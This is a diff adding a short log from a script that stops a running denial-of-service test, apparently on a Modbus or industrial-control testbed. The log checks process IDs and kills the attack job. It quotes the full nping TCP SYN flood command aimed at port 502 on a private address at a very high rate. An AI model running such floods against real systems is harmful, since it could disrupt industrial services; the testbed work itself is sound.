@@ -1,0 +1,23 @@
+STOP SCRIPT START 2025-10-01 08:47:16
+pidfile: /tmp/attack.pid
+Reading pidfile /tmp/attack.pid
+checking pid 3933
+cmdline: tee dos_nping_tcpflood_2025-10-01_08-37.log 
+pid 3933 cmdline does not match basename dos_attack.sh nping_tcpflood 172.27.224.250 90000 900000, skipping
+checking pid 3941
+cmdline: nping --tcp-connect --flags syn --dest-port 502 --rate=90000 -c 900000 -q 172.27.224.250 
+pid 3941 cmdline does not match basename dos_attack.sh nping_tcpflood 172.27.224.250 90000 900000, skipping
+checking pid 3932
+cmdline: sudo nping --tcp-connect --flags syn --dest-port 502 --rate=90000 -c 900000 -q 172.27.224.250 
+pid 3932 cmdline does not match basename dos_attack.sh nping_tcpflood 172.27.224.250 90000 900000, skipping
+checking pid 3929
+cmdline: /bin/bash /temp/dos_attack.sh nping_tcpflood 172.27.224.250 90000 900000 
+Attempting pkill -TERM -P 3929 (children)
+Attempting kill -TERM 3929
+pid 3929 terminated
+Fallback: pkill -TERM -f /temp/dos_attack.sh nping_tcpflood 172.27.224.250 90000 900000
+Fallback: pkill -TERM -f dos_attack.sh nping_tcpflood 172.27.224.250 90000 900000
+Fallback escalate: KILL patterns
+Remaining pgrep -af dos_attack.sh nping_tcpflood 172.27.224.250 90000 900000:
+no process match
+STOP SCRIPT END 2025-10-01 08:47:19
